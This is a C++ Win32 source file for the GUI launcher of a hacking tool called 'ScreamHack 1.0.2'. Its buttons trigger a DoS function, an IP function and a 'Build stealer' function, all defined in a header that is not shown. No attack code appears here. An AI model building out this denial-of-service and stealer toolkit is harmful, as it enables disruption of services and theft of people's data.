#include <iostream>
#include <windows.h>
#include <commdlg.h>
#include <string>
#include <sstream>
#include <fstream>

#include "Scripts/functions.hpp"

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
   switch (uMsg) {
      case WM_DESTROY:
      PostQuitMessage(0);
      return 0;
      case WM_COMMAND:
      if (LOWORD(wParam) == 10) {
        DoS();
      }
      if (LOWORD(wParam) == 20) {
        InternetProtocol();
      }
      if (LOWORD(wParam) == 30) {
        BuildStealer();
      } break;
      return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    const wchar_t CLASS_NAME[] = L"ScreamHack 1.0.2";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        0,
        CLASS_NAME,
        L"ScreamHack 1.0.2",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 300, 150,
        NULL,
        NULL,
        hInstance,
        NULL
    );
    if (hwnd == NULL) {
        return 0;
    }

    CreateWindow(
        L"BUTTON",
        L"DoS",
        WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        5, 5, 275, 30,
        hwnd,
        (HMENU)10,
        (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
        NULL
    );
    // IP
    CreateWindow(
        L"BUTTON",
        L"IP",
        WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        5, 35, 275, 30,
        hwnd,
        (HMENU)20,
        (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
        NULL
    );
    // Stealer
    CreateWindow(
        L"BUTTON",
        L"Build stealer",
        WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        5, 65, 275, 30,
        hwnd,
        (HMENU)30,
        (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
        NULL
    );

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
    }

    return 0;
}